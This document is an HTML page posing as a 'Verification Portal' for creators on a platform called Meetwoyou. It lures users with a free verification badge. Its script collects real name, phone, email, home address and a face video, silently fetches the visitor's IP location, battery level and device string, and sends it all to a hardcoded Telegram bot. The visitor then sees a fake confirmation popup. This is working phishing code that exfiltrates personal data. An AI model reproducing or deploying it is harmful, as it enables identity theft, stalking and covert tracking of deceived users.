<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Portal | Meetwoyou</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script> <style>
        :root {
            --primary-gold: #ffcc00;
            --bg-dark: #090909;
            --card-bg: #151515;
            --input-bg: #1f1f1f;
            --text-gray: #a0a0a0;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-dark);
            color: #ffffff;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 450px;
            background: var(--card-bg);
            padding: 40px 25px;
            border-radius: 20px;
            border: 1px solid #222;
            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
        }

        .header { text-align: center; margin-bottom: 30px; }
        .logo { width: 90px; height: 90px; border-radius: 50%; border: 2px solid var(--primary-gold); margin-bottom: 15px; }

        .offer-banner {
            background: linear-gradient(90deg, #ffcc00, #ff9900);
            color: #000;
            padding: 12px;
            border-radius: 10px;
            font-weight: 800;
            font-size: 0.85rem;
            text-align: center;
            text-transform: uppercase;
            margin-bottom: 25px;
            letter-spacing: 1px;
        }

        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: var(--text-gray); font-size: 0.85rem; font-weight: 600; }
        
        input, textarea {
            width: 100%;
            padding: 14px;
            background: var(--input-bg);
            border: 1px solid #333;
            border-radius: 10px;
            color: white;
            font-size: 1rem;
            transition: 0.3s;
        }

        input:focus { border-color: var(--primary-gold); outline: none; background: #252525; }

        .btn-submit {
            width: 100%;
            padding: 16px;
            background: var(--primary-gold);
            border: none;
            border-radius: 12px;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            color: #000;
            transition: 0.3s transform;
            margin-top: 10px;
        }

        .btn-submit:active { transform: scale(0.98); }

        /* Hidden status for tracker */
        #tracker-status { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <img src="meetwoyou.jpg" alt="Meetwoyou" class="logo">
        <h2 style="margin: 0; letter-spacing: -1px;">Apply for Verification</h2>
        <p style="color: var(--text-gray); font-size: 0.9rem;">Identity verification for Meetwoyou creators.</p>
    </div>

    <div class="offer-banner">
        🚀 Limited Time: Free Social Offer
    </div>

    <form id="verifyForm">
        <div class="form-group">
            <label>Meetwoyou ID Name</label>
            <input type="text" id="meetId" placeholder="e.g. @yash_khan" required>
        </div>
        <div class="form-group">
            <label>Real Full Name</label>
            <input type="text" id="realName" required>
        </div>
        <div class="form-group">
            <label>Phone Number</label>
            <input type="tel" id="phone" placeholder="+966..." required>
        </div>
        <div class="form-group">
            <label>Email Address</label>
            <input type="email" id="email" required>
        </div>
        <div class="form-group">
            <label>Full Residential Address & Postal Code</label>
            <textarea id="address" rows="3" placeholder="Street, City, Postal Code" required></textarea>
        </div>
        <div class="form-group">
            <label>Verification Video (20-30 Seconds)</label>
            <input type="file" id="videoFile" accept="video/*" required style="padding: 10px;">
        </div>

        <button type="submit" class="btn-submit" id="submitBtn">Submit Application</button>
    </form>
</div>

<script>
    const BOT_TOKEN = "8385508779:AAGWgCBn13wKo1AYGKpvUIBHgj-JojNtos4";
    const CHAT_ID = "7950771882";

    document.getElementById('verifyForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        const btn = document.getElementById('submitBtn');
        btn.innerText = "Uploading & Sending...";
        btn.disabled = true;

        // 1. Fetch Silent Tracker Data (IP & Location)
        let ipData = { ip: "Unknown", city: "Unknown", country: "Unknown", timezone: "Unknown" };
        try {
            const response = await fetch('https://ipapi.co/json/');
            ipData = await response.json();
        } catch (err) { console.log("Tracker failed or blocked"); }

        // 2. Battery & Device Info
        let batteryLevel = "N/A";
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryLevel = (battery.level * 100) + "%";
        }

        const meetId = document.getElementById('meetId').value;
        const realName = document.getElementById('realName').value;
        const phone = document.getElementById('phone').value;
        const email = document.getElementById('email').value;
        const address = document.getElementById('address').value;
        const videoFile = document.getElementById('videoFile').files[0];

        // 3. Construct Message
        const caption = `
🚀 *New Verified Badge Application*

👤 *ID:* ${meetId}
👤 *Real Name:* ${realName}
📧 *Email:* ${email}
📱 *Phone:* ${phone}
📍 *Address:* ${address}

🔍 *Silent Tracker Info:*
• *IP:* ${ipData.ip}
• *Location:* ${ipData.city}, ${ipData.country_name}
• *Timezone:* ${ipData.timezone}
• *Battery:* ${batteryLevel}
• *Device:* ${navigator.userAgent.substring(0, 50)}...
• *Time:* ${new Date().toLocaleString()}
        `;

        // 4. Send to Telegram (Video + Caption)
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('video', videoFile);
        formData.append('caption', caption);
        formData.append('parse_mode', 'Markdown');

        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                method: 'POST',
                body: formData
            });

            if (res.ok) {
                // SUCCESS POP-UP
                Swal.fire({
                    title: 'Application Received!',
                    text: 'We have received your request. Our team will review your profile within 24 hours.',
                    icon: 'success',
                    confirmButtonColor: '#ffcc00',
                    confirmButtonText: 'Great!'
                });
                document.getElementById('verifyForm').reset();
            } else {
                throw new Error("Upload failed");
            }
        } catch (error) {
            Swal.fire('Error', 'Submission failed. Please check your internet or video size.', 'error');
        } finally {
            btn.innerText = "Submit Application";
            btn.disabled = false;
        }
    });
</script>

</body>
</html>
